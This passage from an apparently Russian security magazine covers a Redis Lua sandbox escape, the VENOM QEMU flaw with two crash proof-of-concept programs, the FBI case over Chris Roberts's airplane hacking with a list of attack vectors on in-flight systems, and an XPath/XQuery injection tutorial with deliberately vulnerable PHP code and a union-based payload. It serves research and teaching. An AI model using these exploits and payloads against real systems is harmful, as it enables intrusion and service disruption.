Referer: http://www.agarri.fr/kom/archives/2014/09/11/
trying_to_hack_redis_via_http_requests/index.html
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.8
eval "print(\"hello\")" 0
-ERR unknown command 'POST'
-ERR unknown command 'Host:'
-ERR unknown command 'Connection:'
-ERR unknown command 'Content-Length:'
-ERR unknown command 'Pragma:'
-ERR unknown command 'Cache-Control:'
-ERR unknown command 'Origin:'
-ERR unknown command 'User-Agent:'
-ERR unknown command 'Content-Type:'
-ERR unknown command 'Accept:'
-ERR unknown command 'Referer:'
-ERR unknown command 'Accept-Encoding:'
-ERR unknown command 'Accept-Language:'
$-1

В потоке stdout Redis будет следующее:

hello

Правда, из-за таких политик атакующий не сможет прочесть ответ. Это можно
попытаться обойти, если воспользоваться атакой DNS rebinding. Но даже с DNS
rebinding не всегда можно читать ответ из-за неправильного HTTP-формата.
   Однако читать ответ нам и не требуется, так как мы можем упаковать боль-
шой эксплоит, который проверит результат команды redis.call("INFO") и за-
пустит специфическую полезную нагрузку под определенную ОС и архитектуру.

EXPLOIT
В качестве эксплоита мы можем выполнять любые команды. Следующая коман-
да, к примеру, позволяет проверить, уязвим ли сервер:

eval "return tostring(loadstring(string.dump(function() end)))" 0

Если уязвим, будет выведено

"function: 0x7fdcd8439df0"

Если же нет, то

"nil"

Питер Коли в своем исследовании байт-кода Lua описал три очень полезных
примера эксплуатации.
   Первый путь — чтение значения (Value), которое хранится в структуре TValue.
Это позволяет прочитать указатель из значения LUA. Некоторые значения ука-
зателя сами по себе публичны (используется tostring), но не всегда виден спо-
соб получения значения указателя для строки LUA. Второй — чтение 8 байт из
произвольного адреса памяти. Третий — запись 8 байт в произвольный адрес
памяти.
   Использование чтения произвольной памяти делает возможным утечку
адреса стандартных С-функций. Зная адрес C-функции, можно найти базо-
вый адрес бинарника Redis-сервера. После этого можно обнаружить указа-
тели на libc/libsystem и найти базовые адреса для этих библиотек. Далее
из этих библиотек можно получить адреса полезных экспортируемых функций
(longjump/system) и ROP-гаджеты. Такая техника схожа с dynelf из pwntools.
   Чтение произвольной памяти точно так же позволяет узнать адреса внутри
стека. Объект lua_State хранит переменную long_jump. Она указывает на бу-
фер long_jump, который размещен на стеке. Такая утечка адресов стека может
быть полезна, если мы хотим повредить стек или RSP-регистр и переписать rip
в буфере longjump, взяв его под контроль, когда longjump будет вызван.
  В качестве примера советую посмотреть «полезный» эксплоит, патчащий
Redis, от автора уязвимости. Ссылку на него ты можешь найти в соответствую-
щем блоке.

TARGETS
•  Redis < 2.8.21;
•  Redis < 3.0.2
   (поддержка Lua была добавлена в 2.6.0).

SOLUTION
•  Есть исправление от производителя;
•  рекомендуется поставить более защищенный пароль на Redis и переиме-
   новать команду EVAL;
•  патч от автора уязвимости.


VENOM: ПОБЕГ ИЗ ВИРТУАЛОК

 CVSSv2        7 (Av:An/Ac:L/A:Si/C:C/I:C/A:C)
 Дата релиза:  15 мая 2015 года
 Автор:         Jason Geffner
 CVE:           2015-3456

В мае исследователь Джейсон Гефнер (Jason Geffner) из команды CrowdStrike
обнаружил уязвимость в виртуальном контроллере флоппи-диска — FDC (Floppy
Disk Controller) для популярного эмулятора QEMU. В ходе его эксплуатации про-
извольный код из виртуальной машины можно выполнить на основной (хосто-
вой) системе. Это еще называют побегом из ВМ (VM escape). Эту тему мы уже не
раз обсуждали на страницах Х.
   Так как QEMU — это часть инфраструктуры большого количества компа-
ний, то исследователю пришлось ждать официального патча для составления
описания уязвимости и ее публикации. Поэтому весь код в обзоре будет взят
из коммита последней версии FDC в QEMU до публичного патча, вышедшего
тринадцатого мая. Из-за большой опасности этой уязвимости было дано соб-
ственное имя — Venom, что означает яд.
  FDC использует 512-байтовый буфер (FIFO) для хранения данных:

struct FDCtrl {
  ...
  /* FIFO */
  uint8_t *fifo;
  int32_t fifo_size;
  uint32_t data_pos;
  uint32_t data_len;
  ...
};
...
fdctrl->fifo = qemu_memalign(512, FD_SECTOR_LEN);
fdctrl->fifo_size = 512;

Поля data_pos и data_len инициируются в 0 после сброса FDC.
   Код в гостевой ВМ может писать в буфер FIFO, отправляя данные в FDC с
помощью I/O-порта FD_REG_FIFO. В свою очередь, процесс записи обрабаты-
вается функцией, описанной ниже. Каждый отправленный в порт I/O байт про-
ходит через эту функцию как значение параметра.

static void fdctrl_write_data(FDCtrl *fdctrl, uint32_t value)
{
  FDrive *cur_drv;
  int pos;
  ...
  if (fdctrl->data_pos == 0) {
    /* Команда */
    pos = command_to_handler[value & 0xff];
    FLOPPY_DPRINTF("%s command\n", handlers[pos].name);
    fdctrl->data_len = handlers[pos].parameters + 1;
    fdctrl->msr |= FD_MSR_CMDBUSY;
  }
  FLOPPY_DPRINTF("%s: %02x\n", __func__, value);
  fdctrl->fifo[fdctrl->data_pos++] = value;
  if (fdctrl->data_pos == fdctrl->data_len) {
    /* У нас есть все параметры,
     * и мы можем обратиться к команде
     */
    if (fdctrl->data_state & FD_STATE_FORMAT) {
        fdctrl_format_sector(fdctrl);
        return;
    }
    pos = command_to_handler[fdctrl->fifo[0] & 0xff];
    FLOPPY_DPRINTF("treat %s command\n", handlers[pos].name);
    (*handlers[pos].handler)(fdctrl, handlers[pos].direction);
  }
}

Функция, описанная выше, использует первый полученный из I/O байт как ID ко-
манды, где каждый ID соответствует следующему обработчику.

static const struct {
  uint8_t value;
  uint8_t mask;
  const char* name;
  int parameters;
  void (*handler)(FDCtrl *fdctrl, int direction);
  int direction;
} handlers[] = {
  { FD_CMD_READ, 0x1f, "READ", 8, fdctrl_start_transfer, FD_DIR_READ },
  { FD_CMD_WRITE, 0x3f, "WRITE", 8, fdctrl_start_transfer, FD_DIR_WRITE },
  { FD_CMD_SEEK, 0xff, "SEEK", 2, fdctrl_handle_seek },
  ...
};

У каждого обработчика имеется ассоциированный параметр-счетчик (хранится
в параметрах). I/O-байты, записываемые в буфер FIFO после байта ID коман-
ды, рассматриваются как параметры для обработчика команды. Когда fdctrl_
write_data() определяет, что все параметры были доставлены (сравнив уве-
личивающийся параметр data_pos с data_len), вызывается функция обработки
команд для управления данными в FIFO-буфере.
  FDС поддерживает 32 различные FIFO-команды, включая стандартный об-
работчик для неопределенных значений ID команды. Код для каждой функции
обработчика команды сбрасывает FDC-переменную data_pos до 0 в конце
обработки, гарантируя, что буфер FIFO не может быть переполнен. Ниже при-
веден пример, где функция-обработчик fdctrl_handle_partid() вызывает
fdctrl_set_fifo(), которая сбрасывает data_pos до 0:

{ FD_CMD_PART_ID, 0xff, "PART ID", 0, fdctrl_handle_partid },

Функция fdctrl_handle_partid():

static void fdctrl_handle_partid(FDCtrl *fdctrl, int direction)
{
  fdctrl->fifo[0] = 0x41; /* Шаг 1 */
  fdctrl_set_fifo(fdctrl, 1);
}

Функция fdctrl_set_fifo():

static void fdctrl_set_fifo(FDCtrl *fdctrl, int fifo_len)
{
  fdctrl->data_dir = FD_DIR_READ;
  fdctrl->data_len = fifo_len;
  fdctrl->data_pos = 0;
  fdctrl->msr |= FD_MSR_CMDBUSY | FD_MSR_RQM | FD_MSR_DIO;
}

Для тридцати функций — обработчиков команд переменная data_pos сбрасы-
вается до 0 сразу после завершения обработки, так же как в приведенном выше
примере. Тем не менее для двух из них такой сброс задерживается или может
быть «перехитрен».
   Код ниже показывает обработчик для команды READ ID:

{ FD_CMD_READ_ID, 0xbf, "READ ID", 1, fdctrl_handle_readid },

Функция fdctrl_handle_readid:

static void fdctrl_handle_readid(FDCtrl *fdctrl, int direction)
{
  FDrive *cur_drv = get_cur_drv(fdctrl);
  cur_drv->head = (fdctrl->fifo[1] >> 2) & 1;
  timer_mod(fdctrl->result_timer, qemu_clock_get_ns
  (QEMU_CLOCK_VIRTUAL) + (get_ticks_per_sec() / 50));
}

Эта функция устанавливает таймер на 20 мс (result_timer инициализируется
как указатель на функцию fdctrl_result_timer() во время установки началь-
ных значений FDC). После 20 мс выполняется fdctrl_result_timer(), которая
вызывает fdctrl_stop_transfer(), а та, в свою очередь, вызывает fdctrl_
set_fifo(). Последняя функция сбрасывает data_pos до 0. В течение этого
временного промежутка в 20 мс код в гостевой ВМ может продолжать писать в
FIFO-буфер, а fdctrl_write_data() будет продолжать увеличивать data_pos
для каждого полученного I/O-байта. Вследствие этого код в ВМ может перепол-
нить FIFO-буфер произвольными данными.
  Ниже представлен код для обработки команды DRIVE  SPECIFICATION
COMMAND:

{ FD_CMD_DRIVE_SPECIFICATION_COMMAND, 0xff, "DRIVE SPECIFICATION
  COMMAND", 5, fdctrl_handle_drive_specification_command },

Функция fdctrl_handle_drive_specification_command():

static void fdctrl_handle_drive_specification_command(FDCtrl *fdctrl,
int direction)
{
  FDrive *cur_drv = get_cur_drv(fdctrl);
  if (fdctrl->fifo[fdctrl->data_pos - 1] & 0x80) {
    /* Command parameters done */
    if (fdctrl->fifo[fdctrl->data_pos - 1] & 0x40) {
       fdctrl->fifo[0] = fdctrl->fifo[1];
       fdctrl->fifo[2] = 0;
       fdctrl->fifo[3] = 0;
      fdctrl_set_fifo(fdctrl, 4);
    } else {
      fdctrl_reset_fifo(fdctrl);
    }
  } else if (fdctrl->data_len > 7) {
    /* ERROR */
     fdctrl->fifo[0] = 0x80 | (cur_drv->head << 2) | GET_CUR_DRV(fdctrl);
    fdctrl_set_fifo(fdctrl, 1);
  }
}

Эта функция вызывается после того, как FDC получит команду FD_CMD_DRIVE_
SPECIFICATION_COMMAND и ее 5 байт параметров. IF-условие в этом обработчике
будет оцениваться ложным (false), если пятый параметр не будет иметь наиболее
значащий бит (most-significant-bit, MSB). А else-if ветвь будет всегда ложной, если
установить fdctrl->data_len равной 6 с помощью функции fdctrl_write_
data() для команды FD_CMD_DRIVE_SPECIFICATION_COMMAND. Таким образом,
после отправки команды FD_CMD_DRIVE_SPECIFICATION_COMMAND и 5 байт (пя-
тый параметр будет равен 0), код внутри гостевой ВМ сможет продолжать за-
писывать в FIFO-буфер и fdctrl_write_data() будет продолжать увеличивать
data_pos для каждого полученного I/O-байта. В результате код в ВМ может пе-
реполнить FIFO-буфер произвольными данными.

EXPLOIT
В Сети встречаются несколько PoC, которые вызывают DoS виртуальной машины.
1. Из security-рассылки:

   #include <sys/io.h>
   #define FIFO 0x3f5
   int main()
   {
     int i;
     iopl(3);
     outb(0x0a,0x3f5); /* READ ID */
     for (i=0;i<10000000;i++)
       outb(0x42,0x3f5); /* push */
   }

                                                              Запуск





2. От азиатских коллег:

   #include <sys/io.h>
   int main()
   {
     int i ;
     iopl(3);
     outb(0x8e, 0x3f5);
     outb(0x41, 0x3f5);
     outb(0x41, 0x3f5);
     outb(0x41, 0x3f5);
     outb(0x41, 0x3f5);
     outb(0x41, 0x3f5);
     for(i = 0 ; i < 100000 ; i++)
     {
       outb(0x42, 0x3f5);
     }
     return 0 ;
   }





Разбор этой уязвимости можно найти на одном из китайских форумов. Этой же
уязвимости посвящена и специальная страница команды CrowdStrike с инфор-
мацией о том, чем это может грозить, и видео от ребят из rapid7.

TARGETS
QEMU до 13.05.2015.
   Код виртуального контроллера флоппи-диска используется в многочислен-
ных платформах виртуализации, в том числе в Xen и KVM.

SOLUTION
Есть исправление от производителя.
Взлом





                                                                           Андрей Письменный
                                                                                              apismenny@gmail.com,
                                                                                            @apismennyПЕНТЕСТЫ
НА ВИРАЖАХ
ФБР РАССЛЕДУЕТ ДЕЛО
О ВЗЛОМЕ САМОЛЕТА





Современные самолеты напичканы электроникой,
часть которой доступна пассажирам. Что, если под-
ключиться к ней и поискать лазейки? Гарантировать
можно лишь одно — внимание со стороны властей.


 Вообрази ситуацию. Ты занимаешь кресло в самолете, а рядом с тобой си-
 дит мужчина средних лет c длинной седой бородой. Самолет еще не выехал
 на взлетную полосу, а вы уже разговорились: твой попутчик, выяснив, что ты
 кое-что понимаешь в компьютерах и ИБ, рассказывает, что умеет взламывать
 самолеты. Ты, конечно, относишься к этому известию скептически, но задумы-
 ваешься — возможно ли действительно взломать самолет?
   В спинке каждого кресла расположена мультимедийная система — ты в та-
 ких уже успел покопаться, но не нашел ничего интересного. Все, что видит пас-
 сажир, — это оболочка, которую разработала малоизвестная фирма по заказу
 авиакомпании. Тут можно смотреть кино, слушать музыку, изучать карту и ин-
формацию о полете, делать дорогостоящие звонки по спутниковому телефону,
 а иногда даже выводить картинку с камеры на носу самолета. Нет никаких со-
 мнений, что эти терминалы подключены к какой-то централизованной системе,
 но как к ней подобраться?
   Единственная идея — использовать порт USB, который расположен рядом
 с экраном. Через него пассажиры заряжают свои гаджеты, но при желании туда
можно воткнуть и флешку, чтобы послушать свою музыку или посмотреть запа-
 сенный фильм. Если узнать, на какой системе работает развлекательный центр,
 то можно попытаться залить на флешку что-нибудь поинтереснее.
   В нашем воображаемом случае у тебя есть шанс сэкономить время и обра-
 титься к самопровозглашенному специалисту, что ты и делаешь. Он рассказы-
 вает, что заинтересовался этой темой шесть лет назад, когда вместе с колле-
 гой случайно наткнулся на публично доступные руководства пилотов и схемы
 проводки. Изучая чертежи, они обнаружили, что развлекательные системы
 в некоторых моделях самолетов подключены к той же сети, что и система спут-
 никовой связи. Через эту сеть в теории можно подобраться и к системе управ-
 ления электроникой в салоне, а она, в свою очередь, подключена к бортовым
 компьютерам, которые управляют полетом.
   История крайне занимательная, да и бородатый дядька, кажется, отлично
 знает, про что говорит. Дальше, впрочем, становится еще интереснее. Он обо-
 рачивается по сторонам, чтобы убедиться, что бортпроводники заняты тележ-
 ками с едой и приблизятся нескоро, а затем достает облепленный стикерами
MacBook Pro и моток патчкорда. Без всякого предупреждения бородач лезет
 к себе под сиденье и начинает что-то ковырять. Со стороны это выглядит так,
 будто он роется в багаже, но, сидя рядом, ты слышишь скрежет железной крыш-
 ки и характерный щелчок разъема витой пары.
   Вернувшись в прежнее положение и снова развалившись в кресле, твой
 попутчик открывает крышку ноутбука, втыкает в него второй конец патчкорда
 и принимается с достойной скоростью стучать по кнопкам. «Вот дебилы! Так
 и не сменили дефолтные пароли!» — восклицает он, неодобрительно качая го-
 ловой, но явно не без удовольствия. На экране ты видишь не OS X, как можно
 было бы ожидать, судя по яблоку на крышке, а Kali Linux. В терминале мелькают
 строчки отчетов Vortex, рядом открыт Metasploit и VirtualBox с еще одним Линук-
 сом. «Смотри, — снова обращается к тебе сосед и указывает на окно терми-
 нала, — это трафик системы управления полетом. Можно послать двигателям
 какую-нибудь команду, в эмуляторе у меня отлично работало».





 Крис Робертс


 Как ты уже догадался, весь рассказ об этой встрече — плод воображения, и нам
 ничего не известно о том, разговаривал ли бородач с попутчиками и показывал
 ли им экран своего ноутбука. Зато личность его подлинная, а череда его дей-
 ствий взята из отчета ФБР по мотивам допроса. Зовут нашего героя Крис Ро-
 бертс, а об интересе к нему ФБР широкой аудитории стало известно вместе
 с публикацией статьи в журнале Wired в середине мая.

ВООРУЖЕН МАКБУКОМ И ОСОБО ОПАСЕН
 Как столь ловкому хакеру удалось попасться? Дело в том,
 что он и не пытался скрыться. По словам Робертса, к тому
 моменту, как его таки задержали сотрудники Бюро, он успел    WWW
 провести пентест во время пятнадцати перелетов по Амери-                                                                           Запись выступления
 ке. Как минимум тринадцать подобных экспериментов увен-       Криса Робертса
 чались успешным перехватом трафика бортовых систем.         «Самолеты, поезда
                                                                           и автомобили» с   За шесть лет Робертс успел неоднократно обсудить свои
                                                                       конференции GrrCON’11
 достижения с представителями авиакомпаний и выступал                                                                              (youtu.be/zOwKk7Cwc0k)
 с отчетами на хакерских конференциях. Имели место и раз-
 говоры с ФБР, но до событий 15 апреля 2015 года рассказы    Крис Робертс отвечает
                                                                                 на вопросы о самолетных уязвимостях (как потенциальных, так и вполне                                                                                             Security Weekly
 реальных) никого особенно не волновали.                            (youtu.be/oo1sb0kYiJc)
   Похоже, последней каплей стал твит, который Робертс
 отправил, сидя в самолете, летящем по маршруту Чикаго — Сиракьюс (город
 в штате Нью-Йорк). В переводе текст твита гласит примерно следующее: «Сижу
 в 737/800, не изучить ли поближе Box-IFE-ICE-SATCOM? Может, поиграем с со-
общениями EICAS? Кому PASS OXYGEN ON?». IFE расшифровывается как Inflight
 Entertainment System, так называют мультимедийные устройства в спинках кре-
 сел. ICE — In Flight Communications Equipment, бортовая коммуникационная си-
 стема, SATCOM — Satellite Сommunication System, система спутниковой связи.
 EICAS — Engine Indication Crew Alerting System, система индикации параметров
 работы двигателя и предупреждения об отказах. PASS OXYGEN ON — предпо-
 ложительно команда, которая выкидывает кислородные маски в салоне.
    Кто-то из фолловеров Робертса немедленно ответил: «…И-и-и ты за ре-
 шеткой :)», что отчасти было пророчеством. Перечисления систем, с которыми
 предлагал поиграться бородатый пентестер, оказалось достаточно, чтобы при-
 влечь внимание властей. Робертс ответил: «Есть серьезная вероятность того,
 что из-за описанных действий можно легко оказаться в оранжевом костюме :)»
 (оранжевый — цвет тюремной формы в США).
   Самолет еще был в воздухе, а сотрудник безопасности авиакомпании, сле-
дивший за твиттером Робертса, уже позвонил в ФБР. В Сиракьюс болтливого
 микроблогера ждали люди в форме. Последовала длинная беседа, вернее до-
 прос — отчет о нем был опубликован ФБР. Именно он и лег в основу всех по-
 следовавших статей, включая эту. Редакция Х попыталась связаться с Роберт-
сом через его фирму One World Labs, но там ожидаемо сказали, что
 комментарии прессе он больше давать не может.
   Робертс (похоже, не без удовольствия) рассказал ФБР
 о том, как неоднократно проверял на прочность защиту бор-
 товых систем. Он снова продемонстрировал схему самолет-
 ной электропроводки и рассказал об уязвимостях. По его
                                                          INFO словам, их можно обнаружить в развлекательных системах
 производства фирм Panasonic и Thales. Такие встречаются                                                              В отчете ФБР приведен
 в самолетах Boeing 737-800, 737-900, 757-00 и Airbus A320.       полный список
   Правда, самолет, на котором Робертс летел из Чикаго   хакерского софта Криса
                                                                                Робертса. Kali Linux, в Сиракьюс (где планировал совершить пересадку на рейс                                                                                           Metasploit, Wireshark,
 в Денвер), не был снабжен развлекательной системой уяз-      fdXplorer, ParaView,
 вимой модели. Зато агенты исследовали другой самолет:       VxWorks, Nmap,
                                                                                     Vector Canoe и Vortex. тот, на борту которого Робертс провел прошлый полет (из                                                                             Отличная подборка!
 Денвера в Чикаго) несколькими днями ранее. Под креслом,
 где сидел Робертс, нашелся короб с мультимедийным сервером нужной марки,
 который пострадал от несанкционированного доступа («следы раскачивания
 и сдавливания», по словам ФБР). Впрочем, на настоящую улику это не тянет:
 открыть коробку мог кто угодно до или после полета Робертса. Когда хакеру бу-
 дут предъявлены обвинения, то наличие улик, подтверждающих попытку взло-
 ма, станет важным обстоятельством.
   В том, что Робертса хотят наказать по полной программе, нет почти ника-
 ких сомнений. Тот, кстати, считает отчет ФБР неаккуратным. В частности, там
 приведены слова Робертса о том, что ему удалось послать команду двигате-
лю и на какой-то момент повлиять на направление полета (после чего система
 сама выровняла курс). Робертс протестует: он действительно говорил, что про-
 делывал такое на эмуляторе, но в отчете его слова намеренно вырваны из кон-
 текста и представлены так, будто он управлял настоящим самолетом.

ВЕРЮ — НЕ ВЕРЮ
 Главный вопрос, который волнует всех в связи с приключениями Криса Роберт-
 са, — это возможность в действительности взломать развлекательную систему
 и получить через нее доступ к управлению самолетом. Если такое возможно, то
 перевозчикам стоит приготовиться к проверкам и мощной публичной порке.
С такими вещами, мягко говоря, не шутят: если террористическая организация,
 вооружившись подсказками Робертса, могла в любой момент повторить собы-
 тия 11 сентября 2001 года, то американская пресса, узнав об этом, заживо съест
 руководство авиакомпаний. Можно не сомневаться, что будут расследования,
 коллективные иски и судорожные попытки свалить вину на кого угодно.
   Эксперты, которых опросил журнал Wired, все как один
 отвергают возможность настоящего перехвата управ-
 ления. Действительно, мультимедийные системы имеют
 связь с бортовыми компьютерами, для этого служит шина
 ARINC 429. Но коммуникации по ней строго односторон-
                                                         INFO ние: IFE, к примеру, получают информацию о полете, чтобы
 показывать пассажирам карту, но послать ничего не могут.   В Х номер 168 (январь
   Существует также шина ARINC 629 — она уже двуна-     2013-го) ты найдешь
                                                                              статью «Спуфинг правленная (такое решение было принято для упрощения                                                                               в воздухе», которая
 монтажа), но, во-первых, ставится она только на Boeing                                                                                повествует о совсем
 777, а во-вторых, там должна быть система фильтрации    ином векторе атак на
                                                                       воздушные судна — трафика между IFE и авионикой. Данные, которые посту-
                                                                            радиосвязь с землей.
 пают от развлекательных центров, должны просто игнори-
 роваться компьютерами, которые отвечают за полет. То же касается и спутни-
 ковой связи (SATCOM), про доступ к которой говорил Робертс. Пассажирские
 данные и данные, связанные с полетом, строго разграничены: они передаются
 отдельно и на разных частотах.
   В общем, даже если Робертс и отправлял команды двигателям во время по-
 лета, нет никакого способа проверить, были ли они выполнены или благопо-
 лучно пропущены. Исследователь и сам мог не знать, приводят ли его действия
 к каким-то результатам: возможно, он обдурил пассажирские системы и решил,
 что цель достигнута.
   Наверняка пока не знает никто. Крис Робертс своих секретов не раскры-
 вает (или, что не менее вероятно, их не раскрывают в отчете ФБР), авиаком-
 пании от комментариев отказываются, а эксперты хоть и любят порассуждать,
 но в случае чего первыми скажут: «Что ж, ошибались». В общем, если ты дей-
 ствительно встретишь в самолете подозрительного типа, копающегося в пас-
 сажирской электронике, не забудь сообщить ему, что таранить небоскребы ты
 не подписывался.

УЯЗВИМОСТИ В САМОЛЕТЕ
 Александр Багов, Digital Security

 Можно ли перехватить управление самолетом, используя уязвимости в систе-
 ме управления? Мы давно занимаемся исследованиями в этой области, но до
 последнего времени не решались открыто публиковать подробности своих на-
 ходок, ведь всегда есть шанс, что появятся желающие использовать результа-
 ты на практике. Теперь же о взломе самолетов пишут открыто все кому не лень
 (кстати, в том числе и много ерунды).
   За последние пять лет мы накопили большой опыт исследований в этой
 сфере. Тесты на проникновение проводились в ходе пятисот рейсов на бортах
 самолетов тридцати авиакомпаний. Разглашать подробности мы не можем, так
 что расскажем лишь об общих векторах атак.
   Вот список ключевых систем самолета, которые могут заинтересовать зло-
 умышленника.
 •  Система управления полетом (FMS).
 •  Роутер или другое устройство, которое предназначено для передачи дан-
   ных между системами (оно есть не всегда). К примеру — SATCOM, сервер
   для спутниковой связи.
 •  Мультимедиасервер.
 •  Конечные мультимедиаустройства (IFE).
   Исходя из этого, мы можем составить общий список векторов атак.
 •  Какую бы систему ни избрал своей целью злоумышленник, первым этапом,
   скорее всего, станет взлом мультимедийных развлекательных устройств в
    салоне. Добравшись до ОС такого девайса, можно с его помощью действо-
    вать дальше. Для этого есть несколько путей.
 •  Атака через внешние несетевые порты (обычно USB). Чаще всего это дела-
    ется при помощи флешки с Teensy — она эмулирует клавиатуру и посылает
   команды системе. Иногда срабатывает банальное сворачивание окон или
   переключение терминалов, намного чаще возможен перезапуск. Если в мо-
   мент перезапуска подключить USB-клавиатуру, есть шанс получить полный
   контроль над машиной.
 •  Атака на ПО развлекательного устройства через уязвимости в обработчиках
   файлов с носителей. Речь снова идет о USB: IFE зачастую позволяет смо-
    треть и воспроизводить файлы с накопителя пассажира. Наиболее уязви-
   мое место — просмотрщик PDF. Чаще всего на развлекательных системах
   в самолетах установлен Linux (хотя иногда попадается и Windows, а в новых
   моделях — Android). Для разбора PDF обычно применяется XPDF, а в нем
   достаточно уязвимостей.
 •  Атаки через уязвимости в ПО мультимедиаустройства, которые произво-
    дятся через стандартный пользовательский интерфейс (обычно тачскрин).
   Теоретических вариантов множество, а наиболее реальные — это SQL-инъ-
    екции, поскольку они позволяют ввести вредоносный код с клавиатуры в
   параметры запроса (к примеру, прочитать определенный файл), в отличие
    от, например, переполнения буфера, где полезную нагрузку для шелл-кода
   практически невозможно передать. Пока что такой тип уязвимостей редок,
   но возможности IFE растут, а значит, появляется все больше уязвимых ком-
    понентов.
 •  Следующий вектор более сложен и менее распространен, но в случае успе-
    ха дальнейшие шаги оказываются проще. В салонах некоторых самолетов
   можно обнаружить порты Ethernet — как рядом с USB, так и внизу на ручке
    кресла. Определить их назначение бывает непросто, к тому же они часто не
   работают. Но если у атакующего получится подключиться к такому порту, то
   он сможет обращаться к IFE по локальной сети. Мультимедийный сервер,
   равно как и устройства в соседних креслах, скорее всего, не будут доступны,
    зато на развлекательном устройстве найдутся открытые порты: к примеру,
   SSH с известными уязвимостями или слабым паролем. Такой доступ позво-
    лит атакующему дальше работать с комфортом и не вводить команды через
    тачскрин. Также в связке с предыдущей уязвимостью компьютер, подклю-
   ченный по сети к IFE, сможет служить источником для загрузки вредоносно-
    го кода. К примеру, для эксплуатации уязвимости в SQLite, который нередко
   используется в IFE для хранения контента, необходимо загрузить дополни-
   тельную библиотеку для доступа к файлам. В этом случае очень пригодится
   сторонний сервер.
 •  Третий вектор распространен еще меньше, зато открывает доступ не к EFI,
   а к мультимедийному серверу. Иногда мультимедийные устройства крепят
   в спинках при помощи обычных винтов с головкой-шестигранником, раскру-
    тив которые атакующий получает доступ к кабелю Ethernet — его можно от-
   соединить от девайса и подключить к своему ПК. Чтобы не привлекать лиш-
   него внимания, лучше использовать не ноутбук, а что-нибудь вроде Pwn-plug
   производства Pwnie Express.
 •  Четвертый вектор — самый сложный, но успех будет означать наикратчай-
   шую дорогу к цели. В некоторых самолетах можно обнаружить разъемы RJ45
   с пометкой Private use only (только для частного использования). Подклю-
   чившись к ним, можно получить доступ к важным элементам системы.

 Все перечисленные векторы реальны, и злоумышленник или пентестер вполне
 могут использовать их в качестве точек входа. Не факт, что это позволит угнать
 самолет, но связь между системами на борту есть и может послужить для са-
 мых разных целей.
Взлом
СВЕЖИЙ ВЗГЛЯД НА
XPATH/XQUERY INJECTION





НОВЫЕ ТЕХНИКИ
ОБНАРУЖЕНИЯ
И ЭКСПЛУАТАЦИИ
XPATH/XQUERY                                                 Борис Савков
INJECTION





На сегодняшний день широкой общественности известен единственный
boolean-based метод обнаружения и эксплуатации XPath/XQuery injection.
В то же время XPath и XQuery — самые распространенные языки для рабо-
ты с данными в формате XML. Поэтому, чтобы исправить такую несправедли-
вость, я расскажу о других техниках обнаружения и эксплуатации XPath/XQuery
injection.
   Уязвимости класса injection — одни из наиболее популярных и особо
опасных. Об этом свидетельствует их упоминание во всех редакциях OWASP
Top 10. XPath/XQuery injection служат характерными примерами таких уяз-
вимостей. Их краткое описание доступно на сайте WASC в разделе Threat
Classification.
   Сегодня я ограничусь исследованием уязвимостей этого класса в обла-
сти веб-приложений для баз данных, основанных на XQuery. Все рассматри-
ваемые методы были найдены при анализе стандартов языков XPath и XQuery
и проверены на существующих базах данных.

UNION-BASED
Первый метод, о котором сегодня пойдет речь, получил свое название из-за
использования операции объединения запросов |. Для его применения необ-
ходимо, чтобы результат уязвимого запроса от веб-приложения к базе данных
отображался в браузере пользователя. В этом случае можно попытаться за-
менить данные, которые запрашивает веб-приложение, на другие. Например,
на содержимое всех текстовых узлов XML-документа, с которым сейчас рабо-
тает приложение. Ниже приведен листинг кода веб-приложения, уязвимого
для данного метода.

<?php
ini_set('display_errors',0);
# Подключение API базы данных BaseX
include("BaseXClient.php");
class DB {
    # Параметры подключения к базе данных
     protected $host       = 'localhost';
     protected $port       = '1984';
     protected $database   = 'tests';
     protected $user       = 'admin';
     protected $password   = 'admin';
     protected $session    = null;
     public function connect()
    {
         $this->session = new Session($this->host, $this->port,
         $this->user, $this->password);
         $this->session->execute("open ".$this->database);
    }
     public function select($param)
    {
         $input = 'for $i in doc("tests/news.xml")//News[@ID="'.$param.'"]'.
         '/info/text() return <h3> {$i} </h3>';
         $query = $this->session->query($input);
         while($query->more()) {
             print $query->next()."\n";
        }
         $query->close();
    }
     public function exit_db()
    {
         $this->session->close();
    }
}
# Получение пользовательских данных
if(($param = $_GET["id"]) == null)
{
     print "<h3>try use id parameter for access to info</h3>";
     exit;
}
$db = new DB();
$db->connect();
# Вызов уязвимой функции
$db->select($param);
$db->exit_db();
?>

Стоит заметить, что данный пример уязвим также для boolean-based метода.
В нем отсутствует проверка входных данных для параметра id GET-запроса.
В ходе выполнения кода вызывается функция select, которая содержит запрос
к news.xml из базы данных tests. Содержимое news.xml приведено ниже:

<Root>
    <News ID="1">
        <info>British people are my only 'boss' on EU reform,
              says David Cameron</info>
    </News>
    <News ID="2">
        <info>BoE says part of banking payment system down</info>
    </News>
    …
</Root>

Эксплуатация union-based метода заключается во внедрении конструкции 0
and 1=0] | //* | /*[0. Для запроса, приведенного в примере, она будет
иметь следующий вид: 0" and 1=0] | //* | /*["0. При подстановке в за-
прос этой конструкции он разобьется на три других запроса, из которых пер-
вый и последний не вернут ничего. Второй запрос, имеющий вид //*, вернет
содержимое всех XML-документов, доступных пользователю, из-под которого
приложение работает базой.





Результат эксплуатации union-based метода

TIME-BASED
Далеко не всегда результат уязвимого запроса к базе данных подставляется
в код страницы, которую потом видит пользователь в окне своего браузера.
Также не всегда можно детерминировано влиять на содержимое страницы че-
рез уязвимый параметр. Таким образом, при анализе веб-приложения на на-
личие XPath/XQuery  injection union- и boolean-based методов будет явно
недостаточно.
  В классе SQL injection есть time-based метод. Он работает в ситуациях,
когда от времени обработки запроса к базе данных, содержащего уязвимость,
зависит время получения браузером ответа на запрос к веб-приложению.
Ниже представлен пример веб-приложения, которое уязвимо для time-based
и не уязвимо для union и boolean-based.

<?php
ini_set('display_errors',0);
# Подключение API базы данных BaseX
include("BaseXClient.php");
class DB {
    # Параметры подключения к базе данных
    protected $host        = 'localhost';
    protected $port        = '1984';
    protected $database    = 'tests';
    protected $user        = 'admin';
    protected $password    = 'admin';
    protected $session     = null;
    public function connect()
    {
        $this->session = new Session($this->host, $this->port,
        $this->user, $this->password);
        $this->session->execute("open ".$this->database);
    }
    public function select($uid, $username)
    {
        $input = 'doc("tests/users.xml")//Users[./UserName="'.
                  $username.'"]/*[name()="UID"]/text()';
        $query = $this->session->query($input);
        if($query->next() === $uid)
        {
            $query->close();
            $input = 'for $i in doc("tests/users.xml")//Users[./
                      UID="'.$uid.'"]'.
